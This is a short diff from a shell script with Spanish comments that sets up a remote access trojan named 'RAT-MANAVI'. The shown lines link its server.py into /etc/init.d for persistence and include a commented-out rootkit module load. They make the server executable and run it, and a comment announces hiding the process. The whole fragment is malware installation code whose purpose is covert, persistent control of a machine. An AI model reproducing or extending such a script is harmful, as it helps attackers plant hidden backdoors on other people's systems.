@@ -68,6 +68,7 @@ ln -s $RAT_DIR''RAT-MANAVI/server.py /etc/init.d/
 #$INSMOD rootkit.ko
 
 #Ejecutar el server.py
+chmod +x $RAT_DIR''/RAT-MANAVI/server.py
 $RAT_DIR''/RAT-MANAVI/server.py
 
 #Ocultar proceso
